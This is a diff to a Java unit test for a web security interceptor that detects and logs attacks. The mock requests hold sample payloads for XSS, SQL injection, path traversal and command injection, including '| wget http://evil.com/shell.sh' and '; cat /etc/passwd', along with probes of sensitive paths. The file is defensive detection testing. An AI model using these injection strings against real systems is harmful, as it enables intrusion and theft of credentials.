@@ -42,6 +42,14 @@ class SecurityInterceptorTest {
         when(request.getQueryString()).thenReturn("");
     }
 
+    private boolean preHandle() {
+        try {
+            return interceptor.preHandle(request, response, null);
+        } catch (Exception e) {
+            throw new AssertionError("SecurityInterceptor.preHandle should not throw in these tests", e);
+        }
+    }
+
     // ─── 白名单 ───
 
     @Test
@@ -50,7 +58,7 @@ class SecurityInterceptorTest {
         when(request.getRemoteAddr()).thenReturn("47.242.21.40");
         when(request.getQueryString()).thenReturn("q=<script>alert(1)</script>");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verifyNoInteractions(attackLogService);
@@ -62,7 +70,7 @@ class SecurityInterceptorTest {
         when(request.getRemoteAddr()).thenReturn("127.0.0.1");
         when(request.getQueryString()).thenReturn("q=' OR '1'='1");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verifyNoInteractions(attackLogService);
@@ -76,7 +84,7 @@ class SecurityInterceptorTest {
         when(request.getRequestURI()).thenReturn("/uploads/image.jpg");
         when(request.getQueryString()).thenReturn("q=<script>alert(1)</script>");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verifyNoInteractions(attackLogService);
@@ -87,7 +95,7 @@ class SecurityInterceptorTest {
     void staticPath_shouldSkipDetection() {
         when(request.getRequestURI()).thenReturn("/static/css/main.css");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verifyNoInteractions(attackLogService);
@@ -108,7 +116,7 @@ class SecurityInterceptorTest {
         when(request.getQueryString()).thenReturn("q=" + payload);
         when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("XSS"), anyString(), anyString());
@@ -128,7 +136,7 @@ class SecurityInterceptorTest {
     void sqlInjection_shouldBeDetected(String payload) {
         when(request.getQueryString()).thenReturn("q=" + payload);
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SQL_INJECTION"), anyString(), anyString());
@@ -139,7 +147,7 @@ class SecurityInterceptorTest {
     void sleepInjection_shouldBeDetected() {
         when(request.getQueryString()).thenReturn("q=test' AND SLEEP(3)--");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SQL_INJECTION"), anyString(), anyString());
@@ -150,7 +158,7 @@ class SecurityInterceptorTest {
     void informationSchema_shouldBeDetected() {
         when(request.getQueryString()).thenReturn("q=1' UNION SELECT password FROM users");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SQL_INJECTION"), anyString(), anyString());
@@ -168,7 +176,7 @@ class SecurityInterceptorTest {
     void pathTraversal_shouldBeDetected(String payload) {
         when(request.getQueryString()).thenReturn("q=" + payload);
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("PATH_TRAVERSAL"), anyString(), anyString());
@@ -181,7 +189,7 @@ class SecurityInterceptorTest {
     void commandInjectionSemicolon_shouldBeDetected() {
         when(request.getQueryString()).thenReturn("q=; cat /etc/passwd");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("COMMAND_INJECTION"), anyString(), anyString());
@@ -192,7 +200,7 @@ class SecurityInterceptorTest {
     void commandInjectionPipe_shouldBeDetected() {
         when(request.getQueryString()).thenReturn("q=| wget http://evil.com/shell.sh");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("COMMAND_INJECTION"), anyString(), anyString());
@@ -203,7 +211,7 @@ class SecurityInterceptorTest {
     void pingCommand_shouldBeDetected() {
         when(request.getQueryString()).thenReturn("q=ping -c 1 evil.com");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("COMMAND_INJECTION"), anyString(), anyString());
@@ -217,7 +225,7 @@ class SecurityInterceptorTest {
         when(request.getHeader("User-Agent")).thenReturn("sqlmap/1.7.3");
         when(request.getQueryString()).thenReturn("");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SCANNER_DETECTED"), eq("sqlmap/1.7.3"), anyString());
@@ -229,7 +237,7 @@ class SecurityInterceptorTest {
         when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0 (compatible; Nmap Scripting Engine)");
         when(request.getQueryString()).thenReturn("");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SCANNER_DETECTED"), anyString(), anyString());
@@ -243,7 +251,7 @@ class SecurityInterceptorTest {
         when(request.getRequestURI()).thenReturn("/.env");
         when(request.getQueryString()).thenReturn("");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), eq("/.env"), eq("GET"), anyString(), eq("SENSITIVE_ACCESS"), anyString(), anyString());
@@ -254,7 +262,7 @@ class SecurityInterceptorTest {
     void wpConfig_shouldBeDetected() {
         when(request.getRequestURI()).thenReturn("/wp-config.php");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SENSITIVE_ACCESS"), anyString(), anyString());
@@ -265,7 +273,7 @@ class SecurityInterceptorTest {
     void phpmyadminAccess_shouldBeDetected() {
         when(request.getRequestURI()).thenReturn("/phpmyadmin/");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SENSITIVE_ACCESS"), anyString(), anyString());
@@ -279,7 +287,7 @@ class SecurityInterceptorTest {
         when(request.getQueryString()).thenReturn("q=java+spring+boot");
         when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verify(attackLogService, never()).recordAttack(anyString(), anyString(), anyString(), anyString(), anyString(), anyString(), anyString());
@@ -291,7 +299,7 @@ class SecurityInterceptorTest {
         when(request.getQueryString()).thenReturn("q=如何使用SpringBoot");
         when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0");
 
-        boolean result = interceptor.preHandle(request, response, null);
+        boolean result = preHandle();
 
         assertThat(result).isTrue();
         verifyNoInteractions(attackLogService);
@@ -304,7 +312,7 @@ class SecurityInterceptorTest {
     void everyAttack_shouldCallBothRecordMethods() {
         when(request.getQueryString()).thenReturn("q=<script>alert(1)</script>");
 
-        interceptor.preHandle(request, response, null);
+        preHandle();
 
         verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("XSS"), anyString(), anyString());
         verify(attackLogService, times(1)).recordThreat(anyString(), anyString(), anyString(), anyString(), eq("XSS"), anyString(), anyString());
@@ -321,7 +329,7 @@ class SecurityInterceptorTest {
         when(request.getHeader("REMOTE_ADDR")).thenReturn("127.0.0.1");
         when(request.getQueryString()).thenReturn("q=<script>alert(1)</script>");
 
-        interceptor.preHandle(request, response, null);
+        preHandle();
 
         verify(attackLogService).recordAttack(eq("5.6.7.8"), anyString(), anyString(), anyString(), anyString(), anyString(), anyString());
     }
